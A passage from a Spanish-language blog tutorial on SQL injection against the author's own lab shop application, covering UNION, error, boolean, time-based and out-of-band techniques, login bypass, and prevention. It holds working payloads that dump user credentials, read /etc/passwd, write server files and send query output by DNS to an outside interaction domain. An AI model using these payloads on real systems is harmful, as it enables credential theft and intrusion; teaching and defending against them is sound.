highlighter-rouge">1' UNION SELECT column_name FROM information_schema.columns WHERE table_schema="Tienda" AND table_name="Usuarios"-- -</code></p><p><img data-src="/assets/img/commons/sqli/columnas_union.png" alt="Columnas existentes" class="center-image" data-proofer-ignore> <em>Columnas existentes</em></p><p>Ya sabemos que columnas tiene la tabla de <code class="language-plaintext highlighter-rouge">Usuarios</code>, por lo que vamos a proceder a sacar toda la información. Sin embargo, vemos que tenemos que sacar 4 columnas pero la consulta original solo tiene 3 por lo que vamos a tener que recurrir a una concatenación con la orden <code class="language-plaintext highlighter-rouge">concat</code>, quedando así nuestro payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT CONCAT(id,0x3a,nombre,0x3a,contraseña,0x3a,rol), 2, 3 FROM Tienda.Usuarios-- -</code> (0x3a es igual a “:” en hexadecimal).</p><p><img data-src="/assets/img/commons/sqli/datos_union.png" alt="Datos existentes" class="center-image" data-proofer-ignore> <em>Datos existentes</em></p><p>Ya tenemos las credenciales de los usuarios, parecería que ya no podemos hacer mucho más con la base de datos, pero esto no es así ya que por ejemplo, podemos intentar ver si el usuario que está corriendo la base de datos tiene permisos de lectura/escritura, si fuera así podríamos leer archivos del servidor e incluso dejar una puerta trasera que nos de acceso directo al servidor.</p><p>Para poder leer archivos del servidor necesitaremos que nuestro usuario tenga el privilegio <code class="language-plaintext highlighter-rouge">FILE</code> asignado. Podemos ver si tenemos ese privilegio asignado con el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT grantee, privilege_type, 3 FROM information_schema.user_privileges WHERE privilege_type="FILE"-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/privilegios_union.png" alt="Privilegios de nuestro usuario" class="center-image" data-proofer-ignore> <em>Privilegios de nuestro usuario</em></p><p>Vemos que el usuario que está corriendo la base de datos es el mismo que tiene el privilegio <code class="language-plaintext highlighter-rouge">FILE</code>, por lo que vamos a ser capaces de leer archivos. Lo haremos utilizando la orden <code class="language-plaintext highlighter-rouge">LOAD_FILE</code>, esta orden toma como argumento el archivo que queramos leer, vamos a intentar leer el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> con el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT LOAD_FILE("/etc/passwd"), 2, 3-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/lectura_archivos.png" alt="Lectura de archivos" class="center-image" data-proofer-ignore> <em>Lectura de archivos</em></p><p>Ya hemos conseguido leer archivos del servidor ahora vamos a ver que necesitamos para escribirlos. Para poder escribir archivos del lador del servidor necesitamos tres cosas:</p><ol><li>Usuario con privilegio <code class="language-plaintext highlighter-rouge">FILE</code> habilitado<li>Variable <code class="language-plaintext highlighter-rouge">secure_file_priv</code> no habilitada<li>Acceso de escritura en la ubicación en la que queramos escribir.</ol><p>Al revisar si somos capaces de leer archivos en el servidor hemos consultado si nuestro usuario tenía asignado el privilegio <code class="language-plaintext highlighter-rouge">FILE</code>, por lo que no es necesario que lo volvamos a consultar.</p><p>Ya sabemos que contamos con los privilegios necesarios, ahora vamos a ver si la variable <code class="language-plaintext highlighter-rouge">secure_file_priv</code> está activada. Esta variable se utiliza para determinar desde donde podemos leer/escribir archivos. Un valor vacío en esta variable nos indica que podemos leer/escribir en todo el sistema de archivos. Vamos a revisar su valor con el siguiente payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT variable_name, variable_value, 3 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -</code>.</p><p><img data-src="/assets/img/commons/sqli/privilegios2_union.png" alt="Valor de la variable" class="center-image" data-proofer-ignore> <em>Valor de la variable</em></p><p>Vemos que la variable <code class="language-plaintext highlighter-rouge">SECURE_FILE_PRIV</code> no tiene ningún valor asignado por lo que podremos leer/escribir desde cualquier parte del sistema de archivos siempre que tengamos los permisos necesarios para leerlos/crearlos, esto lo haremos con la orden <code class="language-plaintext highlighter-rouge">INTO OUTFILE</code> quedando así nuestro payload <code class="language-plaintext highlighter-rouge">1' UNION SELECT "Esto es una prueba", "", "" INTO OUTFILE "/tmp/prueba.txt"-- -</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ cat /tmp/prueba.txt
Esto es una prueba
</pre></table></code></div></div><p>Ya hemos conseguido crear y escribir archivos del lado del servidor, yo en este caso he escrito un texto cualquiera para la demostración pero podemos llegar a poner puertas traseras que nos den acceso al servidor.</p><h3 id="error-based"><span class="mr-2">Error Based</span><a href="#error-based" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Las inyecciones SQL de tipo Error Based consisten en provocar a propósito un error en la consulta para conseguir de esta forma listar datos desde la salida del propio error.</p><p>Lo primero que haremos será comprobar si realmente estamos ante una inyección SQL de tipo Error Based, esto lo podemos hacer inyectando algún payload en la consulta para ver si conseguimos producir un error.</p><div class="table-wrapper"><table><thead><tr><th style="text-align: left">Payload<th style="text-align: right">Codificado URL<tbody><tr><td style="text-align: left">’<td style="text-align: right">%27<tr><td style="text-align: left">”<td style="text-align: right">%22<tr><td style="text-align: left">#<td style="text-align: right">%23<tr><td style="text-align: left">;<td style="text-align: right">%3B<tr><td style="text-align: left">(<td style="text-align: right">%28<tr><td style="text-align: left">)<td style="text-align: right">%29</table></div><p><img data-src="/assets/img/commons/sqli/error_consulta.png" alt="Error de la consulta" class="center-image" data-proofer-ignore> <em>Detectamos que estamos ante una inyección SQL de tipo Error Based</em></p><p>Tenemos a nuestra disposición una gran cantidad de formas para producir errores, sin embargo, no todas las formas sirven para las mismas situaciones. Sabiendo esto, necesitaremos conseguir información sobre la base de datos utilizada, para de esta forma utilizar el payload correcto que causara el error que necesitamos.</p><p>Si nos fijamos bien en el mensaje de error que hemos recibido antes nos encontremos que el error nos está proporcionando información acerca de la base de datos.</p><ul><li>Información acerca del gestor de bases de datos utilizado: Mariadb<li>Que causó el error: comilla simple (‘)<li>En que parte de la consulta ocurrió el error: (teclado’)</ul><p>Ya sabemos que se está utilizando Mariadb como gestor de bases de datos, por lo que podemos reducir los payloads a utilzar. Como se está utilizando Mariadb vamos a utiliazar el siguiente payload adaptado para Mariadb: <code class="language-plaintext highlighter-rouge">1' AND EXTRACTVALUE('',CONCAT('=',database()))-- -</code></p><p>Este payload convierte una cadena (resultado de database()) en un número entero, lo que generará un error que contendrá el contenido de la cadena a convertir. Utilizamos la función CONCAT para añadir al principio de la cadena el signo igual. En caso de que los primeros caracteres de la cadena sean válidos para convertirlos (números enteros) la cadena no se mostrara en el error, el añadir el signo igual evita esto.</p><p><img data-src="/assets/img/commons/sqli/basedatos_errorbased.png" alt="Conseguimos saber el nombre de la base de datos actual" class="center-image" data-proofer-ignore> <em>Conseguimos saber el nombre de la base de datos actual</em></p><p>Como veis hemos sido capaces de averiguar el nombre de la base de datos actual a través de la salida del error. Ahora vamos a intentar saber las tablas existentes, lo haremos con el siguiente payload <code class="language-plaintext highlighter-rouge">1' AND EXTRACTVALUE('',CONCAT('=',(SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1)))-- -</code>. Recalco que en este tipo de inyección SQL solamente podemos conseguir una columna por consulta SELECT, aun así como estamos usando la función CONCAT podemos añadir más consultas SELECT.</p><p><img data-src="/assets/img/commons/sqli/tablas_errorbased.png" alt="Conseguimos saber el nombre de una de las tablas" class="center-image" data-proofer-ignore> <em>Conseguimos saber el nombre de una de las tablas</em></p><p>Ya si queremos saber el nombre de las columnas y los datos que contienen estas tendremos que hacerlo como en las de tipo <code class="language-plaintext highlighter-rouge">UNION BASED</code>, con la única diferencia de que no son necesarios los datos basura ni la orden UNION y que necesitamos el uso de la orden <code class="language-plaintext highlighter-rouge">LIMIT</code>.</p><h3 id="boolean-based"><span class="mr-2">Boolean Based</span><a href="#boolean-based" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Antes de explicar nada, vamos a necesitar realizar unas modificaciones al codigo de nuestra aplicación web. Los cambios consistiran en comentar el código con el que mostramos los resultados de la consulta, además, añadiremos una línea que nos diga cuando la consulta se ha realizado de una forma correcta:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c1">// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">=</span> <span class="nf">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">))</span> <span class="p">{</span>
<span class="c1">//	echo "&lt;table&gt;";</span>
<span class="c1">//	echo "&lt;tr&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; ID &lt;/th&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; Producto &lt;/th&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; Descripcion &lt;/th&gt;";</span>
<span class="c1">//	echo "&lt;/tr&gt;";</span>
<span class="c1">//	echo "&lt;tr&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['id'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['nombre'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['descripcion'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;/tr&gt;";</span>
<span class="c1">//	echo "&lt;/table&gt;";</span>
	<span class="k">echo</span> <span class="s2">"La consulta se ha realizado correctamente"</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Como he explicado en el apartado de tipos de inyecciones SQL, las inyecciones de tipo Boolean Based utilizan los condicionales para modificar la respuesta del servidor de esta forma consiguiendo saber si un dato es correcto o no.</p><p>Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta. Lo que haremos será inyectar un operador lógico <code class="language-plaintext highlighter-rouge">AND</code> seguido de una expresión que nunca sea cierta, como por ejemplo 1=2. Veremos que no nos da respuesta el servidor, si es así probaremos con una expresión que siempre sea cierta como por ejemplo 1=1. Si nos da respuesta el servidor significará que estamos ante una inyección SQL de tipo Boolean Based.</p><p>Cabe recalcar que necesitamos que la primera expresión del AND devuelva TRUE, es decir, que el dato de la primera expresión se encuentre en la base de datos. Si no conocemos algún dato que este en la base de datos podemos utilizar un <code class="language-plaintext highlighter-rouge">OR</code> aunque recomiendo utilizar mejor el <code class="language-plaintext highlighter-rouge">AND</code>.</p><p><img data-src="/assets/img/commons/sqli/descubrir_boolean2.png" alt="No nos responde la p gina" class="center-image" data-proofer-ignore> <em>No nos respondela p gina</em></p><p><img data-src="/assets/img/commons/sqli/descubrir_boolean.png" alt="Nos responde la página" class="center-image" data-proofer-ignore> <em>Nos responde la página</em></p><p>Ya sabiendo que estamos ante una inyección SQL de tipo Boolean Based voy a explicar la explotación de esta. Para el ejemplo vamos a utilizar el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND SUBSTR(database(),1,1)="t"-- -</code></p><p>Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra “t” (es Case Insensitive), si esta comparación nos devuelve un valor <code class="language-plaintext highlighter-rouge">TRUE</code> nos contestará de una forma normal, de no ser así asi el servidor no nos contestara. Basandonos en esto ya vamos a saber si la letra es válida según si nos responde o no.</p><p>Ya tenemos la primera letra del nombre de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND SUBSTR(database(),2,1)="t"-- -</code>, daos cuenta que he variado el número que hace referenca a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).</p><p>Tras muchas consultas encontraremos que el nombre de la base de datos es “Tienda”, si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1),1,1)="p"-- -</code>.</p><p>Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo <code class="language-plaintext highlighter-rouge">UNION BASED</code>, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y de que en estas necesitamos utilizar la orden LIMIT.</p><p>De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es Productos, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 1,1),1,1)="u"-- -</code>.</p><p>Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo <code class="language-plaintext highlighter-rouge">UNION BASED</code>, con la diferencia de los datos basura, la orden UNION y la orden LIMIT.</p><p>Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND database()="Tienda"-- -</code>. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.</p><h3 id="time-based"><span class="mr-2">Time Based</span><a href="#time-based" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Como en las inyecciones SQL de tipo Boolean Based necesitamos hacer un cambio en el código, en este caso simplemente tendremos que comentar la línea que nos indica que la consulta se ha realizado correctamente.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1">// Obtenemos y mostramos ls resultados de la consulta. Los resultados se almacenan en un array por el cual iteramos</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">=</span> <span class="nf">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$results</span><span class="p">))</span> <span class="p">{</span>
<span class="c1">//	echo "&lt;table&gt;";</span>
<span class="c1">//	echo "&lt;tr&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; ID &lt;/th&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; Producto &lt;/th&gt;";</span>
<span class="c1">//	echo "  &lt;th align='left'&gt; Descripcion &lt;/th&gt;";</span>
<span class="c1">//	echo "&lt;/tr&gt;";</span>
<span class="c1">//	echo "&lt;tr&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['id'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['nombre'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;td align='left'&gt; " . $rows['descripcion'] . "&lt;/td&gt;";</span>
<span class="c1">//	echo "&lt;/tr&gt;";</span>
<span class="c1">//	echo "&lt;/table&gt;";</span>
<span class="c1">//	echo "La consulta se ha realizado correctamente";</span>
<span class="p">}</span>

</pre></table></code></div></div><p>Las inyecciones SQL de tipo Time Based son muy parecidas a las de tipo Boolean Based, la única diferencia entre ellas radica en la forma en la que conseguimos detectar si nuestro payload es correcto. Para detectar si nuestro payload es correcto o no utilizaremos condicionales que retrasaran la respuesta del servidor.</p><p>Lo primero que necesitaremos es comprobar si realmente estamos ante una inyección SQL de este tipo, esto lo podemos hacer inyectando código en la consulta, quedando nuestro payload así <code class="language-plaintext highlighter-rouge">teclado' and sleep(5)-- -</code>. Cabe recalcar que como en las de tipo <code class="language-plaintext highlighter-rouge">Boolean Based</code> necesitamos que la primera expresión de <code class="language-plaintext highlighter-rouge">AND</code> devuelva un valor <code class="language-plaintext highlighter-rouge">TRUE</code>.</p><p>Si el servidor espera 5 segundos antes de darnos una respuesta es que nos encontramos ante una inyección SQL de tipo Time Based, a continuación voy explicar la explotación de esta. Para el ejemplo vamos a utiliar el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND IF(SUBSTR(database(),1,1)="t", sleep(5),1)-- -</code>.</p><p>Con este payload estamos comparando la primera letra de la base de datos actual (Tienda) con la letra “t” (es Case Insensitive), si esta comparación nos devuelve un valor <code class="language-plaintext highlighter-rouge">TRUE</code> esperará 5 segundos, de no ser así no esperará. Con este payload el servidor esperará 5 segundos por que la letra “t” es la primera de la base de datos actual, si esta no fuera la primera letra tendremos que ir cambiando continuamente la letra hasta encontrar la que hace que el servidor retrase su respuesta. Ya tenemos la primera letra de la base de datos actual, ahora tendremos que conseguir la segunda, para ello utilizaremos el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND IF(SUBSTR(database(),2,1)="i", sleep(5),1)-- -</code>, notese que he variado el número que hace referencia a la letra que se quiere evaluar en este caso ahora vamos a evaluar la segunda letra de la base de datos (i).</p><p>Tras muchas consultas encontraremos que el nombre de la base de datos actual es “Tienda”, si queremos conseguir otros datos lo que tendremos que hacer es cambiar el valor de la string de la que vamos a sacar la letra. Por ejemplo, ahora vamos a sacar una tabla de la base de datos actual, esto lo haríamos con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 0,1),1,1)="p",sleep(5),1)-- -</code>. Si nos fijamos, la string que vamos a comparar con las letras y que conseguimos a través de la consulta SELECT es muy parecida a las que hacíamos con las de tipo <code class="language-plaintext highlighter-rouge">UNION BASED</code>, con la diferencia de que en estas no vamos a necesitar utilizar los datos basura ni la orden UNION y que vamos a necesitar utilizar la orden LIMIT.</p><p>De nuevo, tras muchas consultas encontraremos que la el nombre de la primera tabla es <code class="language-plaintext highlighter-rouge">Productos</code>, si queremos conseguir el nombre de la otra simplemente variaremos la variable que limita los resultados de la función LIMIT, vamos a conseguir el nombre de la otra tabla con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' AND IF(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema="Tienda" LIMIT 1,1),1,1)="u",sleep(5),1)-- -</code>.</p><p>Ya si queremos conseguir el nombre de las columnas y los valores que almacenan estas es exactamente igual que en las de tipo <code class="language-plaintext highlighter-rouge">UNION BASED</code>, con la diferencia de los datos basura y la orden <code class="language-plaintext highlighter-rouge">LIMIT</code>.</p><p>Quiero recalcar que podemos variar la forma del payload, en nuestro ejemplo vamos comparando letra por letra pero podemos hacerlo de otras maneras, como por ejemplo probando palabras enteras. Si queremos hacerlo utilizando palabras directamente podemos hacerlo con el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' and if(database()="Tienda", sleep(5),1)-- -</code>. En ambos métodos recomiendo que os hagáis un script para agilizar el proceso pues se os puede llegar a hacer pesado si lo hacéis manualmente.</p><h3 id="out-of-band"><span class="mr-2">Out-of-band</span><a href="#out-of-band" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Este tipo de inyecciones se dan cuando no somos capaces de conseguir la salida de la consulta de ninguna forma posible y además tenemos la capacidad de generar peticiones HTTP(S) o DNS.</p><p>Para explotar este tipo de inyecciones SQL necesitaremos no tener la variable <code class="language-plaintext highlighter-rouge">secure_file_priv</code> habilitada, para consultar su valor tendremos que utilizar una consulta explotando este tipo de inyección, por lo que no será necesario consultar su valor ya que si somo capaces de hacerlo es por que no está habilitada.</p><p>Para explotar este tipo de inyección SQL necesitaremos una herramienta que utilizaremos para interceptar la información que mandamos a través de consultas HTTP(S) o DNS, yo voy a utilizar la herramienta <code class="language-plaintext highlighter-rouge">interactsh</code>, os dejo su <a href="https://github.com/projectdiscovery/interactsh">repositorio de github</a> y un <a href="https://www.youtube.com/watch?v=p-N56aR4Omw">video para aprender a usarla</a>.</p><p>Iniciaremos la herramienta, al iniciarla nos proporcianaran un dominio al que tendremos que enviar las peticiones DNS o HTTP(S). Vamos a sacar la versión de la base de datos, el usuario que está corriendo la base de datos y la base de datos en uso. Os dejo un <a href="https://zenodo.org/record/3556347#.YtGJj3ZByUm">estudio</a> en el que explotan este tipo de inyección SQL según la base de datos utilizada, en nuestro caso, utilizaremos el siguiente payload <code class="language-plaintext highlighter-rouge">teclado' UNION SELECT 1, 2, LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.',(SELECT user()),'.', (SELECT database()),'.','cb69n4j0744r7nrac3k0p8anqgpwzkhsc.oast.site\\vfw'))-- -</code> (teneis que cambiar el dominio por el que os hayan proporcionado).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[10.5.12-MariaDB-0+deb11u1.xdann1.Tienda.cb69n4j0744r7nrac3k0p8anqgpwzkhsc] Received DNS interaction (AAAA) from 85.62.233.105 at 2022-07-11 22:16:09
</pre></table></code></div></div><p>De esta forma hemos conseguido enviar una solicitud DNS a un dominio el cual tiene de subdominios la salida de las consultas SELECT. Si queremos conseguir otros datos simplemente tendremos que cambiar las consultas SELECT.</p><h3 id="paneles-de-login"><span class="mr-2">Paneles de Login</span><a href="#paneles-de-login" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Soy consciente de que esto no es un tipo de inyección SQL pero creo que se merece un apartado para explicar distintas formas de explotarlos.</p><p>Para que un panel de login nos de acceso necesitaremos que la consulta devuelva un valor <code class="language-plaintext highlighter-rouge">TRUE</code>, es decir, que el usuario y la contraseña sean correctas. No nos sirve que el usuario sea correcto y que la contraseña sea incorrecta, por lo que deducimos no está utilizando un <code class="language-plaintext highlighter-rouge">OR</code> y que en cambio, está utilizando un <code class="language-plaintext highlighter-rouge">AND</code>. Deducimos que la consulta que se hace a la base de datos es parecida a la siguiente:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>SELECT * FROM Usuarios WHERE usuario='[input usuario]' AND contraseña='[input usuario]';
</pre></table></code></div></div><p>Si quisieramos iniciar sesión en nuestro panel de login tendríamos que dar unas credenciales válidas, vamos a ver como se haría esto desde un punto de vista lógico.</p><p><img data-src="/assets/img/commons/sqli/login_logico.png" alt="Panel de Login Lógico" class="center-image" data-proofer-ignore> <em>Panel del Login visto de una forma Lógica</em></p><p>Vemos que ambas expresiones del <code class="language-plaintext highlighter-rouge">AND</code> tienen valores <code class="language-plaintext highlighter-rouge">TRUE</code> por lo que el valor de la consulta se convierte en <code class="language-plaintext highlighter-rouge">TRUE</code>, dandonos acceso al panel del usuario en cuestión. Como hemos visto en los otros tipos de inyecciones SQL hemos sido capaces de inyectar código en la consulta para que nos lo interprete, de esta forma consiguiendo subvertir la lógica de la consulta. Pues esto mismo vamos a hacer, tenemos dos formas principales para hacer esto, voy a pasar a explicarlas.</p><p>La primera de ellas consiste en utilizar los comentarios para subvertir la lógica de la consulta. Existen varias formas de comentar en SQL:</p><ul><li>(#): es preferible poner mejor la forma codificada en url (%23) ya que de la forma normal lo toma como una etiqueta.<li>(– ): es necesario un espacio luego de los dos guiones, por lo que necesitaremos poner un guion después del espacio ya que si no lo hacemos no nos interpretara el espacio.<li>(/* */): no suele usarse en inyecciones SQL.</ul><p>Las dos primeras formas son las más utilizadas para las inyecciones SQL. La función de los comentarios será la de hacer que se ignore parte de la consulta, subvirtiendo la lógica de la consulta.Lo malo de este tipo de inyección en los paneles de login es que necesitaremos saber de un usuario existente para llevarla a cabo, vamos a verlo de una forma más sencilla a través de una imagen.</p><p><img data-src="/assets/img/commons/sqli/inyeccion_comentarios.png" alt="Inyección SQL a través de Comentarios" class="center-image" data-proofer-ignore> <em>Inyección SQL a través de Comentarios</em></p><p>Como la consulta nos devuelve un valor <code class="language-plaintext highlighter-rouge">TRUE</code> nos dará accesso al panel del usuario. Esta es una buena forma de saltarse un login pero tiene la falla de que necesitamos saber de un usuario existente, aquí entra la otra forma, utilizando el operador lógico <code class="language-plaintext highlighter-rouge">OR</code>.</p><p>Utilizando el operador lógico <code class="language-plaintext highlighter-rouge">OR</code> de manera correcta conseguiremos que ambas expresiones del <code class="language-plaintext highlighter-rouge">AND</code> (usuario y contraseña) nos devuelvan un valor <code class="language-plaintext highlighter-rouge">TRUE</code>. Vamos a aprovechar que el operador <code class="language-plaintext highlighter-rouge">OR</code> nos devuelve un valor <code class="language-plaintext highlighter-rouge">TRUE</code> cuando una de las expresiones tenga un valor <code class="language-plaintext highlighter-rouge">TRUE</code>, de esta forma conseguiremos que ambas expresiones del <code class="language-plaintext highlighter-rouge">AND</code> tengan un valor <code class="language-plaintext highlighter-rouge">TRUE</code>, vamos a ver la consulta mejor de una forma lógica.</p><p><img data-src="/assets/img/commons/sqli/inyeccion_or.png" alt="Inyecci n SQL a través del operador OR" class="center-image" data-proofer-ignore> <em>Inyección SQL a través del operador OR</em></p><p>Vemos que finalmente la consulta nos devuelve un valor <code class="language-plaintext highlighter-rouge">TRUE</code> (notese el orden de las operaciones, como en matemáticas), por lo que nos dará acceso al panel del usuario. Si nos fijamos hemos puesto unas credenciales que no coinciden con ninguna almacenada en la base de datos, sin embargo, la consulta nos ha devuelto un valor <code class="language-plaintext highlighter-rouge">TRUE</code> por lo que nos dara acceso a la cuenta del primer usuario que por lo general es el administrador.</p><p>Os dejo un <a href="https://github.com/payloadbox/sql-injection-payload-list#sql-injection-auth-bypass-payloads">repositorio</a> de github en el que han recopilado una gran cantidad de payloads para bypasear paneles de login.</p><hr /><h2 id="prevención-inyecciones-sql"><span class="mr-2">Prevención inyecciones SQL</span><a href="#prevención-inyecciones-sql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Las inyecciones SQL generalmente son causadas por aplicaciones web mal codificadas o privilegios de bases de datos y servidores back-end mal configurados. Existen varias formas de reducir las posibilidades de ser vulnerable a las inyecciones de SQL a través de métodos de codificación seguros, como la desinfección y validación de la entrada del usuario, controles adecuados de los privilegios y usuarios del back-end y el uso de consultas parametrizadas.</p><p>La inyección se puede evitar desinfectando cualquier entrada del usuario, lo que hace que las consultas inyectadas sean inútiles. Esto lo podemos lograr de dos formas:</p><ul><li>Las bibliotecas proporcionan múltiples funciones para lograr esto, un ejemplo de ello es la función mysqli_real_escape_string(). Esta función escapa caracteres como (‘) y (“), por lo que cuando un usuario los introduzca no serán interpretados como código sino como una cadena.<li>Utilizando expresiones regulares que limiten algunos caracteres, como el input del campo nombre solamente puede componerse por letras podemos restringir la entrada a solo estos caracteres, lo que evitará la inyección de caracteres especiales como (‘) y (“).</ul><p>Las entradas de datos también se pueden validar en función de los datos a consultar para garantizar que coincida con la estructura de la entrada esperada. Por ejemplo, si solicitamos un correo electrónico al usuario, podemos filtrar que el input tenga una estructura igual a la siguiente “usuario@dominio.com”.</p><p>Además es una buena práctica hacer uso de las consultas parametrizadas, usandolas no concatenamos directamente el valor de la variable de la entrada del usuario a la consulta SQL sino que primero pasamos a la consulta SQL un conjunto de parametros que luego escaparán la entrada del usuario.</p><p>Debemos asegurarnos de que el usuario que realiza las consultas en la base de datos tenga los permisos mínimos, a esto se le conoce en el mundo de la ciberseguridad como “Principio del Mínimo Privilegio”. Los usuarios administradores bajo ningún concepto deben realizar las consultas a la base de datos ya que al ser administradores tienen permisos que podrían comprometer el servidor.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/explicaci%C3%B3n/'>Explicación</a>, <a href='/categories/sqli/'>SQLi</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLi</a> <a href="/tags/laboratorio/" class="post-tag no-text-decoration" >Laboratorio</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Inyecciones+SQL+-+xDaNN1&url=https%3A%2F%2Fxdann1.github.io%2Fposts%2Finyecciones-sql%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Inyecciones+SQL+-+xDaNN1&u=https%3A%2F%2Fxdann1.github.io%2Fposts%2Finyecciones-sql%2F" data-toggle="tooltip" 